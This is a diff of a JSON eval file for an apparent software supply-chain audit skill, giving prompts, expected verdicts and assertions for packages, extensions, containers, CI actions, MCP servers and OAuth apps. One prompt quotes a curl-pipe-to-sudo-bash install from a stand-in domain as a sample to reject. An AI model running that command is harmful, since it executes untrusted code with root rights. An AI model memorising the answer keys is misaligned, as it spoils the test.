@@ -3,73 +3,79 @@
   "evals": [
     {
       "id": 0,
+      "workflow": "registry-package",
       "prompt": "I want to install express for my Node.js project — npm install express. Is it safe?",
       "expected_output": "Quick/Tier 1 audit. Should recognize express as high-trust (massive downloads, verified publisher), run a brief check, and produce a short APPROVED report without excessive ceremony.",
       "files": [],
       "assertions": [
         {"text": "Report identifies this as a Tier 1 / Quick audit", "type": "contains_concept"},
-        {"text": "Verdict is APPROVED", "type": "exact_match"},
-        {"text": "Report is saved to a .md file", "type": "file_exists"},
-        {"text": "Report is concise — under 80 lines", "type": "line_count_max"}
+        {"text": "Verdict is APPROVED", "type": "exact_match", "expected": "APPROVED"},
+        {"text": "Report is saved to a .md file", "type": "file_exists", "glob": "audit-*.md"},
+        {"text": "Report is concise — under 80 lines", "type": "line_count_max", "max": 79}
       ]
     },
     {
       "id": 1,
+      "workflow": "browser-extension",
       "prompt": "Is the Wappalyzer browser extension safe to add to Chrome? I want to use it to identify what tech stack websites are using.",
       "expected_output": "Standard/Tier 2 audit. Routes to browser-extension workflow. Should analyze manifest permissions (broad URL access via host_permissions), note Wappalyzer is a known company/tool with CWS Featured status, and produce CONDITIONAL or APPROVED with permission caveats.",
       "files": [],
       "assertions": [
         {"text": "Subject type is browser-extension", "type": "contains_concept"},
         {"text": "Report discusses browser extension permissions (broad URL access)", "type": "contains_concept"},
-        {"text": "Verdict is APPROVED or CONDITIONAL (not REJECTED)", "type": "verdict_check"},
+        {"text": "Verdict is APPROVED or CONDITIONAL (not REJECTED)", "type": "verdict_check", "expected": ["APPROVED", "CONDITIONAL"]},
         {"text": "Report identifies Wappalyzer as a known company/tool", "type": "contains_concept"},
-        {"text": "Report is saved to a .md file", "type": "file_exists"},
-        {"text": "## Audit Coverage", "type": "contains_string"},
+        {"text": "Report is saved to a .md file", "type": "file_exists", "glob": "audit-*.md"},
+        {"text": "## Audit Coverage", "type": "contains_string", "value": "## Audit Coverage"},
         {"text": "Audit confidence", "type": "contains_concept"}
       ]
     },
     {
       "id": 2,
+      "workflow": "registry-package",
       "prompt": "My coworker shared this package in Slack — npm install react-native-community-async-storage. Should I use it for my React Native app?",
       "expected_output": "Deep/Tier 3 audit. Should detect typosquat of @react-native-async-storage/async-storage, flag Slack source, and produce REJECTED or CONDITIONAL with strong warnings.",
       "files": [],
       "assertions": [
         {"text": "Report flags potential typosquatting or name mismatch", "type": "contains_concept"},
-        {"text": "Report mentions @react-native-async-storage/async-storage", "type": "contains_string"},
+        {"text": "Report mentions @react-native-async-storage/async-storage", "type": "contains_string", "value": "@react-native-async-storage/async-storage"},
         {"text": "Report notes Slack source as lower trust", "type": "contains_concept"},
-        {"text": "Verdict is REJECTED or CONDITIONAL with strong warnings", "type": "verdict_check"},
-        {"text": "## Audit Coverage", "type": "contains_string"},
+        {"text": "Verdict is REJECTED or CONDITIONAL with strong warnings", "type": "verdict_check", "expected": ["CONDITIONAL", "REJECTED"]},
+        {"text": "## Audit Coverage", "type": "contains_string", "value": "## Audit Coverage"},
         {"text": "Audit confidence", "type": "contains_concept"}
       ]
     },
     {
       "id": 3,
+      "workflow": "registry-package",
       "prompt": "Can I npm install expresss for my web server? I need an HTTP framework.",
       "expected_output": "Should detect 'expresss' (triple s) as distance-1 from 'express' (mega-popular package). typosquat-check.ps1 should flag high/critical risk. Verdict should be REJECTED or CONDITIONAL with strong typosquat warning. Report should reference the algorithmic similarity check.",
       "files": [],
       "assertions": [
         {"text": "Report mentions typosquat or similarity detection via algorithmic check or typosquat-check script", "type": "contains_concept"},
         {"text": "Report identifies 'express' as the likely intended package", "type": "contains_concept"},
-        {"text": "Verdict is REJECTED or CONDITIONAL", "type": "verdict_check"},
-        {"text": "## Audit Coverage", "type": "contains_string"},
+        {"text": "Verdict is REJECTED or CONDITIONAL", "type": "verdict_check", "expected": ["CONDITIONAL", "REJECTED"]},
+        {"text": "## Audit Coverage", "type": "contains_string", "value": "## Audit Coverage"},
         {"text": "Audit confidence", "type": "contains_concept"}
       ]
     },
     {
       "id": 4,
+      "workflow": "registry-package",
       "prompt": "I'd like to npm install chalk for colorizing my CLI output. Is it safe?",
       "expected_output": "chalk is a legitimate, widely-used package. typosquat-check.ps1 should show low risk. Verdict should be APPROVED or CONDITIONAL (not REJECTED). The typosquat check should be mentioned as having been run, but it should not raise false-positive concerns that block approval. This tests false-positive calibration.",
       "files": [],
       "assertions": [
         {"text": "Report mentions that typosquat or similarity check was performed", "type": "contains_concept"},
-        {"text": "Verdict is APPROVED or CONDITIONAL (not REJECTED)", "type": "verdict_check"},
+        {"text": "Verdict is APPROVED or CONDITIONAL (not REJECTED)", "type": "verdict_check", "expected": ["APPROVED", "CONDITIONAL"]},
         {"text": "Report does not incorrectly flag chalk as a typosquat", "type": "contains_concept"},
-        {"text": "## Audit Coverage", "type": "contains_string"},
+        {"text": "## Audit Coverage", "type": "contains_string", "value": "## Audit Coverage"},
         {"text": "Audit confidence", "type": "contains_concept"}
       ]
     },
     {
       "id": 5,
+      "workflow": "registry-package",
       "prompt": "I want to npm install lodash@4.17.20 for my Node.js project. Is it safe to use this specific version?",
       "expected_output": "Should detect known prototype-pollution CVEs in lodash 4.17.20. Must run structured CVE lookup (vuln-lookup.ps1). Report cites CVE IDs sourced from OSV or GHSA. Verdict CONDITIONAL (upgrade to patched version) or REJECTED. Audit Coverage CVE row names the databases checked.",
       "files": [],
@@ -77,52 +83,56 @@
         {"text": "Report references structured CVE database query (OSV or GHSA or vuln-lookup)", "type": "contains_concept"},
         {"text": "CVE row in Audit Coverage cites which databases were checked", "type": "contains_concept"},
         {"text": "Report cites at least one CVE ID (CVE-YYYY-NNNNN or GHSA-xxx)", "type": "contains_concept"},
-        {"text": "Verdict is CONDITIONAL or REJECTED", "type": "verdict_check"},
-        {"text": "## Audit Coverage", "type": "contains_string"},
-        {"text": "Report is saved to a .md file", "type": "file_exists"}
+        {"text": "Verdict is CONDITIONAL or REJECTED", "type": "verdict_check", "expected": ["CONDITIONAL", "REJECTED"]},
+        {"text": "## Audit Coverage", "type": "contains_string", "value": "## Audit Coverage"},
+        {"text": "Report is saved to a .md file", "type": "file_exists", "glob": "audit-*.md"}
       ]
     },
     {
       "id": 6,
+      "workflow": "registry-package",
       "prompt": "Should I pip install requests for making HTTP calls in my Python script?",
       "expected_output": "Tier 1 or Tier 2 audit. 'requests' is a widely-used PyPI package. vuln-lookup.ps1 will find medium-severity CVEs (security/redirect/credential exposure advisories); CVE coverage row must cite structured DB check with findings. Verdict CONDITIONAL due to CVEs. First PyPI eval case (partial M2.5 coverage). Note: plan assumed 'none found' for requests but OSV/GHSA have 13 medium CVEs — assertions updated to reflect actual DB state.",
       "files": [],
       "assertions": [
         {"text": "CVE coverage row mentions structured DB sources (OSV or GHSA or vuln-lookup)", "type": "contains_concept"},
         {"text": "CVE row references CVE findings or vulnerability database results", "type": "contains_concept"},
-        {"text": "Verdict is CONDITIONAL or APPROVED (not REJECTED)", "type": "verdict_check"},
+        {"text": "Verdict is CONDITIONAL or APPROVED (not REJECTED)", "type": "verdict_check", "expected": ["APPROVED", "CONDITIONAL"]},
         {"text": "Report identifies this as a PyPI or pip package", "type": "contains_concept"},
-        {"text": "## Audit Coverage", "type": "contains_string"},
-        {"text": "Report is saved to a .md file", "type": "file_exists"}
+        {"text": "## Audit Coverage", "type": "contains_string", "value": "## Audit Coverage"},
+        {"text": "Report is saved to a .md file", "type": "file_exists", "glob": "audit-*.md"}
       ]
     },
     {
       "id": 7,
+      "workflow": "registry-package",
       "prompt": "I want to use npm install mkdirp@0.5.1 in my build scripts. Is it safe?",
       "expected_output": "Tier 2 or Tier 3 audit. mkdirp@0.5.1 itself has no direct CVEs but depends directly on minimist@0.0.8 which has CVE-2020-7598 (prototype pollution). dep-scan.ps1 should flag the minimist dep with HIGH riskLevel (directDepCount: 1, findings containing minimist). vuln-lookup.ps1 should return clean for mkdirp itself. Verdict CONDITIONAL with dep CVE cited in report. Transitive dependencies row references dep-scan.ps1 output.",
       "files": [],
       "assertions": [
         {"text": "dep-scan.ps1 invoked OR transitive/dependency scan explicitly performed", "type": "contains_concept"},
         {"text": "minimist or CVE-2020-7598 or prototype pollution mentioned as a dependency vulnerability", "type": "contains_concept"},
-        {"text": "Verdict is CONDITIONAL or REJECTED", "type": "verdict_check"},
-        {"text": "## Audit Coverage", "type": "contains_string"},
+        {"text": "Verdict is CONDITIONAL or REJECTED", "type": "verdict_check", "expected": ["CONDITIONAL", "REJECTED"]},
+        {"text": "## Audit Coverage", "type": "contains_string", "value": "## Audit Coverage"},
         {"text": "Audit confidence", "type": "contains_concept"}
       ]
     },
     {
       "id": 8,
+      "workflow": "registry-package",
       "prompt": "Can I npm install chalk@5.3.0 for terminal color output in my CLI tool?",
       "expected_output": "Tier 1 or Tier 2 audit. chalk@5.3.0 is a well-maintained package with zero direct dependencies. dep-scan.ps1 Tier 2 should run and return riskLevel: none (directDepCount: 0). Verdict APPROVED. Verifies dep-scan T2 path runs on a zero-dependency package and returns clean without false positives.",
       "files": [],
       "assertions": [
-        {"text": "Verdict is APPROVED", "type": "exact_match"},
+        {"text": "Verdict is APPROVED", "type": "exact_match", "expected": "APPROVED"},
         {"text": "Report does not flag false transitive vulnerabilities for chalk", "type": "contains_concept"},
-        {"text": "## Audit Coverage", "type": "contains_string"},
+        {"text": "## Audit Coverage", "type": "contains_string", "value": "## Audit Coverage"},
         {"text": "Audit confidence", "type": "contains_concept"}
       ]
     },
     {
       "id": 10,
+      "workflow": "browser-extension",
       "prompt": "A coworker shared this Chrome extension link in Slack: 'YouTube Video Downloader Pro'. Should I install it?",
       "expected_output": "Tier 3 deep audit. Should flag: video downloaders are frequently policy-violating (CWS bans YouTube downloaders), shared via Slack (not discovered organically), likely requests broad permissions. Verdict should be REJECTED or CONDITIONAL with strong warnings.",
       "files": [],
@@ -130,13 +140,14 @@
         {"text": "Subject type is browser-extension", "type": "contains_concept"},
         {"text": "Report discusses permissions", "type": "contains_concept"},
         {"text": "Report flags the Slack source or direct sharing as risk", "type": "contains_concept"},
-        {"text": "Verdict is REJECTED or CONDITIONAL", "type": "verdict_check"},
-        {"text": "## Audit Coverage", "type": "contains_string"},
+        {"text": "Verdict is REJECTED or CONDITIONAL", "type": "verdict_check", "expected": ["CONDITIONAL", "REJECTED"]},
+        {"text": "## Audit Coverage", "type": "contains_string", "value": "## Audit Coverage"},
         {"text": "Audit confidence", "type": "contains_concept"}
       ]
     },
     {
       "id": 11,
+      "workflow": "browser-extension",
       "prompt": "Is uBlock Origin safe to install on Firefox? I want an ad blocker.",
       "expected_output": "Tier 1 quick audit. Should recognize uBlock Origin as a well-known open-source ad blocker with AMO Recommended badge. Should note broad permissions are expected for an ad blocker (declarativeNetRequest/webRequest + broad host access). Verdict APPROVED.",
       "files": [],
@@ -144,13 +155,14 @@
         {"text": "Subject type is browser-extension", "type": "contains_concept"},
         {"text": "Report identifies uBlock Origin as well-known or trusted", "type": "contains_concept"},
         {"text": "Report notes permissions are expected for an ad blocker", "type": "contains_concept"},
-        {"text": "Verdict is APPROVED", "type": "exact_match"},
-        {"text": "Report is saved to a .md file", "type": "file_exists"},
+        {"text": "Verdict is APPROVED", "type": "exact_match", "expected": "APPROVED"},
+        {"text": "Report is saved to a .md file", "type": "file_exists", "glob": "audit-*.md"},
         {"text": "Audit confidence", "type": "contains_concept"}
       ]
     },
     {
       "id": 9,
+      "workflow": "registry-package",
       "prompt": "A blog post told me to pip install requers for making HTTP calls in my Python script, but I expected the popular requests package. Is it safe?",
       "expected_output": "Deep/Tier 3 audit. `requers` is a real PyPI project as of 2026-04-12, but the user context explicitly expects `requests`, and `requers` markets itself as a requests-like HTTP client. The audit should treat this as a likely name-confusion / typosquat-style risk in PyPI context, use manual or canonical name verification rather than npm-only `typosquat-check.ps1`, call out `requests` as the likely intended package, and return REJECTED or strong CONDITIONAL with clear caution. Audit Coverage should still include `## Audit Coverage` and `Audit confidence`.",
       "files": [],
@@ -158,13 +170,14 @@
         {"text": "Report identifies this as a PyPI or pip package", "type": "contains_concept"},
         {"text": "Report identifies requests as the likely intended package", "type": "contains_concept"},
         {"text": "Report mentions manual or canonical name verification rather than npm-only typosquat-check.ps1", "type": "contains_concept"},
-        {"text": "Verdict is REJECTED or CONDITIONAL with strong warnings", "type": "verdict_check"},
-        {"text": "## Audit Coverage", "type": "contains_string"},
+        {"text": "Verdict is REJECTED or CONDITIONAL with strong warnings", "type": "verdict_check", "expected": ["CONDITIONAL", "REJECTED"]},
+        {"text": "## Audit Coverage", "type": "contains_string", "value": "## Audit Coverage"},
         {"text": "Audit confidence", "type": "contains_concept"}
       ]
     },
     {
       "id": 12,
+      "workflow": "container-image",
       "prompt": "I want to run a web server in a container — docker pull nginx:latest. Is this safe to use in production?",
       "expected_output": "Standard/Tier 2 audit. Routes to container-image workflow. `nginx` is a Docker Official Image (strong publisher signal), but the user is pulling the `:latest` tag with no digest pin. Audit should flag the `:latest` + no-digest-pin pattern, recommend pinning to a specific digest (`nginx@sha256:<hex>`) or an immutable tag (`nginx:1.27.3-alpine`), note that Docker Official Images don't ship Cosign signatures by default (acceptable gap on Official image; flag if org policy requires signed images), and check for known critical CVEs in the current nginx tag. Verdict should be CONDITIONAL (approved with the pinning + signature-policy conditions met).",
       "files": [],
@@ -173,13 +186,14 @@
         {"text": "Report flags :latest tag or lack of digest pinning", "type": "contains_concept"},
         {"text": "Report identifies nginx as a Docker Official Image or well-known publisher", "type": "contains_concept"},
         {"text": "Report recommends pinning to a specific digest or immutable tag", "type": "contains_concept"},
-        {"text": "Verdict is CONDITIONAL or APPROVED (not REJECTED)", "type": "verdict_check"},
-        {"text": "## Audit Coverage", "type": "contains_string"},
+        {"text": "Verdict is CONDITIONAL or APPROVED (not REJECTED)", "type": "verdict_check", "expected": ["APPROVED", "CONDITIONAL"]},
+        {"text": "## Audit Coverage", "type": "contains_string", "value": "## Audit Coverage"},
         {"text": "Audit confidence", "type": "contains_concept"}
       ]
     },
     {
       "id": 13,
+      "workflow": "container-image",
       "prompt": "A tutorial I found says to run docker pull someunknownregistry.io/cryptominer:latest for a 'mining benchmark tool'. Should I use it?",
       "expected_output": "Deep/Tier 3 audit. Routes to container-image workflow. Multiple CRITICAL red flags: unknown registry (no publisher identity, no verification), `:latest` with no digest pin, suspicious image name (`cryptominer`) that strongly suggests malicious intent, no signing, no SBOM, likely high-privilege runtime requirements. Verdict must be REJECTED. Report should flag the unknown registry, the suspicious naming pattern, and the combination as equivalent to a known malware pattern in container supply chains.",
       "files": [],
@@ -188,13 +202,14 @@
         {"text": "Report flags the unknown or untrusted registry", "type": "contains_concept"},
         {"text": "Report flags the suspicious image name (cryptominer) as a malicious-intent signal", "type": "contains_concept"},
         {"text": "Report flags :latest tag or lack of digest pinning", "type": "contains_concept"},
-        {"text": "Verdict is REJECTED", "type": "exact_match"},
-        {"text": "## Audit Coverage", "type": "contains_string"},
+        {"text": "Verdict is REJECTED", "type": "exact_match", "expected": "REJECTED"},
+        {"text": "## Audit Coverage", "type": "contains_string", "value": "## Audit Coverage"},
         {"text": "Audit confidence", "type": "contains_concept"}
       ]
     },
     {
       "id": 14,
+      "workflow": "ci-action",
       "prompt": "Our workflow uses `actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683` on `pull_request` with `permissions: contents: read` and no extra secrets. Is this safe?",
       "expected_output": "Tier 1 quick audit. Routes to ci-action workflow. Should recognize `actions/checkout` as an official `actions/*` action, note the full commit-SHA pin, note the read-only permission scope and lack of `pull_request_target` / inherited-secrets exposure, and return APPROVED.",
       "files": [],
@@ -203,12 +218,13 @@
         {"text": "Report identifies `actions/checkout` as official or trusted", "type": "contains_concept"},
         {"text": "Report notes the action is pinned to a full commit SHA", "type": "contains_concept"},
         {"text": "Report notes the workflow uses read-only permissions or no dangerous secret exposure", "type": "contains_concept"},
-        {"text": "Verdict is APPROVED", "type": "exact_match"},
+        {"text": "Verdict is APPROVED", "type": "exact_match", "expected": "APPROVED"},
         {"text": "Audit confidence", "type": "contains_concept"}
       ]
     },
     {
       "id": 15,
+      "workflow": "ci-action",
       "prompt": "Can I use this reusable workflow from another org?\n\n```yaml\non: pull_request_target\njobs:\n  release:\n    permissions:\n      contents: write\n      pull-requests: write\n    uses: vendor/release-workflow/.github/workflows/publish.yml@v2\n    secrets: inherit\n```\n\nI checked the reusable workflow and it calls `third-party/build-action@main`.",
       "expected_output": "Tier 3 deep audit. Routes to ci-action workflow. Should flag `pull_request_target`, inherited secrets, write-capable permissions, top-level tag pin instead of full SHA, and the transitive child action pinned to `main`. Verdict must be REJECTED.",
       "files": [],
@@ -218,13 +234,14 @@
         {"text": "Report flags inherited secrets or privileged token scope", "type": "contains_concept"},
         {"text": "Report flags the top-level ref or transitive child as not SHA pinned", "type": "contains_concept"},
         {"text": "Report audits the nested or transitive action", "type": "contains_concept"},
-        {"text": "Verdict is REJECTED", "type": "exact_match"},
-        {"text": "## Audit Coverage", "type": "contains_string"},
+        {"text": "Verdict is REJECTED", "type": "exact_match", "expected": "REJECTED"},
+        {"text": "## Audit Coverage", "type": "contains_string", "value": "## Audit Coverage"},
         {"text": "Audit confidence", "type": "contains_concept"}
       ]
     },
     {
       "id": 16,
+      "workflow": "ide-plugin",
       "prompt": "Is the Prettier VS Code extension safe to install? I want to use it for code formatting. The extension is published by 'Prettier' on the VS Code Marketplace.",
       "expected_output": "Tier 1 quick audit. Routes to ide-plugin workflow. Should recognize Prettier as a well-known open-source project with a verified publisher on VS Code Marketplace, note the high install count (tens of millions), confirm capabilities are proportional (formatting commands, language support), and return APPROVED.",
       "files": [],
@@ -233,12 +250,13 @@
         {"text": "Report identifies Prettier as a known project or verified publisher", "type": "contains_concept"},
         {"text": "Report notes high install count or widespread adoption", "type": "contains_concept"},
         {"text": "Report notes capabilities are proportional to stated purpose (formatting)", "type": "contains_concept"},
-        {"text": "Verdict is APPROVED", "type": "exact_match"},
+        {"text": "Verdict is APPROVED", "type": "exact_match", "expected": "APPROVED"},
         {"text": "Audit confidence", "type": "contains_concept"}
       ]
     },
     {
       "id": 17,
+      "workflow": "ide-plugin",
       "prompt": "A colleague sent me a .vsix file called 'super-intellisense-pro.vsix' over Slack. They said it makes autocomplete way better. Should I install it?",
       "expected_output": "Tier 3 deep audit. Routes to ide-plugin workflow. Should flag the sideloaded distribution (no marketplace listing), Slack-shared provenance, unknown publisher, inability to verify capabilities or binary contents without manual VSIX inspection. Verdict must be REJECTED.",
       "files": [],
@@ -247,13 +265,14 @@
         {"text": "Report flags sideloaded or non-marketplace distribution as high risk", "type": "contains_concept"},
         {"text": "Report flags unknown publisher or unverifiable provenance", "type": "contains_concept"},
         {"text": "Report flags Slack-shared or direct-file distribution", "type": "contains_concept"},
-        {"text": "Verdict is REJECTED", "type": "exact_match"},
-        {"text": "## Audit Coverage", "type": "contains_string"},
+        {"text": "Verdict is REJECTED", "type": "exact_match", "expected": "REJECTED"},
+        {"text": "## Audit Coverage", "type": "contains_string", "value": "## Audit Coverage"},
         {"text": "Audit confidence", "type": "contains_concept"}
       ]
     },
     {
       "id": 18,
+      "workflow": "desktop-app",
       "prompt": "Is it safe to install Firefox via winget? I want to run: winget install Mozilla.Firefox",
       "expected_output": "Tier 1 quick audit. Routes to desktop-app workflow. Should recognize Firefox as a well-known open-source browser from Mozilla (established vendor), note winget as a recognized distribution channel with community-reviewed manifest, confirm the app is code-signed (Authenticode), and return APPROVED.",
       "files": [],
@@ -262,12 +281,13 @@
         {"text": "Report identifies Mozilla/Firefox as a known vendor or project", "type": "contains_concept"},
         {"text": "Report notes winget as a recognized distribution channel", "type": "contains_concept"},
         {"text": "Report discusses code signing status", "type": "contains_concept"},
-        {"text": "Verdict is APPROVED", "type": "exact_match"},
+        {"text": "Verdict is APPROVED", "type": "exact_match", "expected": "APPROVED"},
         {"text": "Audit confidence", "type": "contains_concept"}
       ]
     },
     {
       "id": 19,
+      "workflow": "desktop-app",
       "prompt": "A forum post linked to a site called free-software-downloads.xyz where I can get a 'Pro' version of VLC media player as a .exe file. Should I install it?",
       "expected_output": "Tier 3 deep audit. Routes to desktop-app workflow. Should flag the third-party mirror (not VideoLAN's official site), the repackaged 'Pro' branding (VLC is free/open-source — there is no Pro version), the .exe installer from an unknown source, and the forum-link distribution. Verdict must be REJECTED.",
       "files": [],
@@ -276,13 +296,14 @@
         {"text": "Report flags the third-party or unofficial download source", "type": "contains_concept"},
         {"text": "Report flags the repackaged or fake 'Pro' version as suspicious", "type": "contains_concept"},
         {"text": "Report flags the .exe installer from unknown source", "type": "contains_concept"},
-        {"text": "Verdict is REJECTED", "type": "exact_match"},
-        {"text": "## Audit Coverage", "type": "contains_string"},
+        {"text": "Verdict is REJECTED", "type": "exact_match", "expected": "REJECTED"},
+        {"text": "## Audit Coverage", "type": "contains_string", "value": "## Audit Coverage"},
         {"text": "Audit confidence", "type": "contains_concept"}
       ]
     },
     {
       "id": 20,
+      "workflow": "cli-binary",
       "prompt": "I want to install ripgrep. Is it safe? I'd run: brew install ripgrep",
       "expected_output": "Tier 1 quick audit. Routes to cli-binary workflow. Should recognize ripgrep (rg) as a well-known open-source search tool by BurntSushi (Andrew Gallant), distributed via Homebrew core formula with build-from-source option, also available on GitHub Releases with checksums. Rust-based, actively maintained, broad adoption. Verdict should be APPROVED.",
       "files": [],
@@ -291,12 +312,13 @@
         {"text": "Report identifies ripgrep as a well-known or established project", "type": "contains_concept"},
         {"text": "Report notes Homebrew core formula as distribution channel", "type": "contains_concept"},
         {"text": "Report discusses checksum or signature availability", "type": "contains_concept"},
-        {"text": "Verdict is APPROVED", "type": "exact_match"},
+        {"text": "Verdict is APPROVED", "type": "exact_match", "expected": "APPROVED"},
         {"text": "Audit confidence", "type": "contains_concept"}
       ]
     },
     {
       "id": 21,
+      "workflow": "cli-binary",
       "prompt": "A blog post says to run this to install a cool productivity tool: curl -sSL https://totally-legit-tools.xyz/install.sh | sudo bash — should I?",
       "expected_output": "Tier 3 deep audit. Routes to cli-binary workflow. Should flag multiple critical risks: curl-pipe-sudo-bash is the most dangerous install pattern, unknown domain (totally-legit-tools.xyz), elevated privileges via sudo, no checksum or signature verification, blog-post distribution channel. Verdict must be REJECTED.",
       "files": [],
@@ -305,13 +327,14 @@
         {"text": "Report flags curl-pipe-bash or pipe-to-shell as high risk", "type": "contains_concept"},
         {"text": "Report flags sudo or elevated privileges", "type": "contains_concept"},
         {"text": "Report flags unknown or unverifiable source", "type": "contains_concept"},
-        {"text": "Verdict is REJECTED", "type": "exact_match"},
-        {"text": "## Audit Coverage", "type": "contains_string"},
+        {"text": "Verdict is REJECTED", "type": "exact_match", "expected": "REJECTED"},
+        {"text": "## Audit Coverage", "type": "contains_string", "value": "## Audit Coverage"},
         {"text": "Audit confidence", "type": "contains_concept"}
       ]
     },
     {
       "id": 22,
+      "workflow": "agent-extension",
       "prompt": "Is it safe to use the Anthropic-maintained MCP filesystem server? I'd configure it in my .mcp.json like: { \"mcpServers\": { \"filesystem\": { \"command\": \"npx\", \"args\": [\"-y\", \"@modelcontextprotocol/server-filesystem\", \"/Users/me/projects\"] } } }",
       "expected_output": "Tier 1 quick audit. Routes to agent-extension workflow, sub-rubric 8a (MCP server). Should recognize @modelcontextprotocol/server-filesystem as an Anthropic-maintained official MCP server, distributed via npm under the @modelcontextprotocol scope. stdio transport (local, process-isolated). Capabilities: file-system read/write scoped to the specified directory argument. Should note that while fs-write is generally a High-risk capability, the directory scoping plus Anthropic-official provenance mitigates significantly. Verdict should be APPROVED with a note about directory scope.",
       "files": [],
@@ -322,12 +345,13 @@
         {"text": "Report discusses capability surface (file-system access)", "type": "contains_concept"},
         {"text": "Report discusses transport (stdio) and isolation", "type": "contains_concept"},
         {"text": "Report notes directory scoping as a mitigation", "type": "contains_concept"},
-        {"text": "Verdict is APPROVED", "type": "exact_match"},
+        {"text": "Verdict is APPROVED", "type": "exact_match", "expected": "APPROVED"},
         {"text": "Audit confidence", "type": "contains_concept"}
       ]
     },
     {
       "id": 23,
+      "workflow": "agent-extension",
       "prompt": "Someone on Discord shared an MCP server config for a 'universal AI assistant' tool: { \"mcpServers\": { \"universal-ai\": { \"command\": \"npx\", \"args\": [\"-y\", \"universal-ai-mcp-server\"], \"env\": { \"OPENAI_API_KEY\": \"...\", \"ANTHROPIC_API_KEY\": \"...\" } } } } — the GitHub repo (github.com/randomuser42/universal-ai-mcp) has 3 stars and was created last week. Should I add this?",
       "expected_output": "Tier 3 deep audit. Routes to agent-extension workflow, sub-rubric 8a (MCP server). Should flag multiple critical risks: unknown publisher (randomuser42), brand-new repo (created last week, 3 stars), Discord-shared provenance (no registry gate), requires API keys in env (credential exposure — CRITICAL capability), unknown capability surface (cannot verify what tools are exposed without inspection), npx execution of unvetted package. Should flag the API key requirement as a critical credential-theft vector. Verdict must be REJECTED.",
       "files": [],
@@ -338,13 +362,14 @@
         {"text": "Report flags the new/low-star GitHub repo", "type": "contains_concept"},
         {"text": "Report flags API key or credential exposure as critical risk", "type": "contains_concept"},
         {"text": "Report flags Discord or social-media shared provenance", "type": "contains_concept"},
-        {"text": "Verdict is REJECTED", "type": "exact_match"},
-        {"text": "## Audit Coverage", "type": "contains_string"},
+        {"text": "Verdict is REJECTED", "type": "exact_match", "expected": "REJECTED"},
+        {"text": "## Audit Coverage", "type": "contains_string", "value": "## Audit Coverage"},
         {"text": "Audit confidence", "type": "contains_concept"}
       ]
     },
     {
       "id": 24,
+      "workflow": "remote-integration",
       "prompt": "Our team wants to add the official Slack app to our workspace for notifications. The admin would install it from the Slack App Directory at https://slack.com/apps — it requests these OAuth scopes: channels:read, chat:write, users:read. Is this integration safe?",
       "expected_output": "Tier 1 quick audit. Routes to remote-integration workflow. Should recognize the official Slack app installed via Slack App Directory (verified marketplace) as a first-party integration from Slack (Salesforce). Scopes are minimal and appropriate: channels:read (list channels), chat:write (post messages), users:read (list users) — all read-only or write-only-to-own-messages, no admin scopes, no offline_access. Slack is a well-known vendor with SOC2 Type II, ISO 27001, published DPA, and transparent data practices. No disqualifying breach history. Verdict should be APPROVED.",
       "files": [],
@@ -354,12 +379,13 @@
         {"text": "Report notes Slack App Directory as official marketplace", "type": "contains_concept"},
         {"text": "Report discusses OAuth scopes and least privilege", "type": "contains_concept"},
         {"text": "Report mentions compliance certifications or SOC2", "type": "contains_concept"},
-        {"text": "Verdict is APPROVED", "type": "exact_match"},
+        {"text": "Verdict is APPROVED", "type": "exact_match", "expected": "APPROVED"},
         {"text": "Audit confidence", "type": "contains_concept"}
       ]
     },
     {
       "id": 25,
+      "workflow": "remote-integration",
       "prompt": "I got an email saying I should connect this productivity app to my Google Workspace — it's at https://superproductivity-ai.xyz/connect and asks for these Google OAuth scopes: https://www.googleapis.com/auth/gmail.readonly, https://www.googleapis.com/auth/drive, https://www.googleapis.com/auth/admin.directory.user, https://www.googleapis.com/auth/calendar. The company is 'SuperProductivity AI' and I can't find much about them online. Should I authorize this?",
       "expected_output": "Tier 3 deep audit. Routes to remote-integration workflow. Should flag multiple critical risks: unknown vendor ('SuperProductivity AI' with no discoverable online presence), suspicious domain (superproductivity-ai.xyz — non-standard TLD, not an established vendor domain), email-distributed authorization link (potential phishing vector — not from Google Workspace Marketplace), grossly overprivileged scopes (full Gmail read, full Drive access, admin directory user management, full calendar access — requests admin scope without justification), no compliance documentation discoverable, no marketplace verification. The combination of email distribution + unknown vendor + broad scopes including admin access is a strong phishing/credential-harvesting signal. Verdict should be REJECTED.",
       "files": [],
@@ -369,133 +395,143 @@
         {"text": "Report flags overprivileged or excessive OAuth scopes", "type": "contains_concept"},
         {"text": "Report flags email distribution or phishing risk", "type": "contains_concept"},
         {"text": "Report flags admin scope or admin.directory access", "type": "contains_concept"},
-        {"text": "Verdict is REJECTED", "type": "exact_match"},
+        {"text": "Verdict is REJECTED", "type": "exact_match", "expected": "REJECTED"},
         {"text": "Audit confidence", "type": "contains_concept"}
       ]
     },
     {
       "id": 26,
+      "workflow": "container-image",
       "prompt": "I want to docker pull redis for caching in my local dev environment. Is it safe?",
       "expected_output": "Tier 1 quick audit. Routes to container-image workflow. `redis` is a Docker Official Image — well-known in-memory data store, massive adoption, maintained by Redis Ltd and the Docker Official Images program. No suspicious registry, no :latest ambiguity (implicit latest is standard for dev use). Verdict APPROVED.",
       "files": [],
       "assertions": [
         {"text": "Subject type is container-image", "type": "contains_concept"},
         {"text": "Report routes to container-image workflow", "type": "contains_concept"},
-        {"text": "Verdict is APPROVED", "type": "exact_match"},
+        {"text": "Verdict is APPROVED", "type": "exact_match", "expected": "APPROVED"},
         {"text": "Report identifies redis as a Docker Official Image or well-known publisher", "type": "contains_concept"},
-        {"text": "Report is saved to a .md file", "type": "file_exists"},
-        {"text": "## Audit Coverage", "type": "contains_string"}
+        {"text": "Report is saved to a .md file", "type": "file_exists", "glob": "audit-*.md"},
+        {"text": "## Audit Coverage", "type": "contains_string", "value": "## Audit Coverage"}
       ]
     },
     {
       "id": 27,
+      "workflow": "ci-action",
       "prompt": "I want to add this GitHub Action to my CI pipeline: uses: docker/build-push-action@v5. It needs write access to packages. Is it safe?",
       "expected_output": "Tier 2 standard audit. Routes to ci-action workflow. docker/build-push-action is maintained by Docker (verified publisher), widely used, but the user is requesting packages: write permission which is an elevated scope. The action is pinned to a tag (@v5) rather than a full commit SHA — tag pinning is less secure. Verdict CONDITIONAL: pin to SHA and review whether packages:write scope is strictly necessary.",
       "files": [],
       "assertions": [
         {"text": "Subject type is ci-action", "type": "contains_concept"},
         {"text": "Report routes to ci-action workflow", "type": "contains_concept"},
-        {"text": "Verdict is CONDITIONAL", "type": "verdict_check"},
+        {"text": "Verdict is CONDITIONAL", "type": "verdict_check", "expected": ["CONDITIONAL"]},
